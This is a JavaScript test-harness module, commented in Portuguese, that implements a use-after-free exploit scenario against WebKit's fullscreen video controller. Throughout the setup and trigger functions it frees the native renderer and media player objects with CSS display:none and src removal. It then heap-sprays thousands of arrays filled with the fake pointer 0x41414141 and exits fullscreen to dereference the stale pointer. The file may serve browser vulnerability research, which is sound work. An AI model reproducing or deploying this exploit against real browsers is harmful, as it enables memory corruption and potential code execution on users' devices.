
/**
 * CENÁRIO: VIDEO_FULLSCREEN_RENDERER_UAF
 * Alvo: FullscreenVideoController Null/Stale Pointer Dereference
 */

export default {
    id:       'VIDEO_FULLSCREEN_RENDERER_UAF',
    category: 'Media',
    risk:     'CRITICAL',
    description: 'Bypassa o OS Deadlock mantendo o vídeo no DOM, mas destrói ' +
                 'as estruturas C++ nativas (RenderObject e MediaPlayerPrivate) ' +
                 'usando CSS display:none e src nullification antes de sair do Fullscreen.',

    setup: async function() {
        this.container = document.createElement('div');
        document.body.appendChild(this.container);
        
        this.video = document.createElement('video');
        this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
        this.video.controls = true;
        this.container.appendChild(this.video);

        // A munição: 0x41414141 (Ponteiro falso)
        this.sprayPayload = new Uint32Array(256);
        this.sprayPayload.fill(0x41414141);

        await new Promise(resolve => {
            const timeout = setTimeout(resolve, 400);
            this.video.addEventListener('loadedmetadata', () => {
                clearTimeout(timeout);
                resolve();
            }, { once: true });
        });
    },

    trigger: async function() {
        try {
            // 1. ENTRADA NATIVA NO FULLSCREEN
            if (this.video.webkitEnterFullscreen) {
                this.video.webkitEnterFullscreen();
            } else if (this.video.webkitRequestFullscreen) {
                this.video.webkitRequestFullscreen();
            }

            await new Promise(r => setTimeout(r, 300)); 

            // 2. O NOVO TEARDOWN (Destruição Fantasma)
            // A. Destrói o RenderObject C++ (A caixa de layout)
            this.video.style.display = 'none';
            
            // B. Destrói o MediaPlayerPrivate C++ (O descodificador nativo)
            this.video.removeAttribute('src');
            this.video.load();

            // 3. SPRAY: Enchemos a memória imediatamente
            this.spray = [];
            for (let i = 0; i < 5000; i++) {
                let arr = new Uint32Array(256);
                arr.set(this.sprayPayload);
                this.spray.push(arr);
            }

            // 4. SAÍDA FATAL
            // O controlador vai tentar acessar video->renderer() que agora é nulo/freed,
            // ou video->player() que aponta para o nosso spray 0x41414141.
            if (this.video.webkitExitFullscreen) {
                this.video.webkitExitFullscreen();
            } else if (document.webkitExitFullscreen) {
                document.webkitExitFullscreen();
            }

        } catch(e) {}
    },

    probe: [
        s => s.video.readyState,
        s => s.video.webkitDecodedFrameCount,
        s => { try { return s.video.buffered.start(0); } catch(e) { return e.name; } }
    ],

    cleanup: function() {
        // Agora sim, limpamos o DOM de forma segura no final do ciclo
        try { this.container.remove(); } catch(e) {}
        this.spray = null;
    }
};
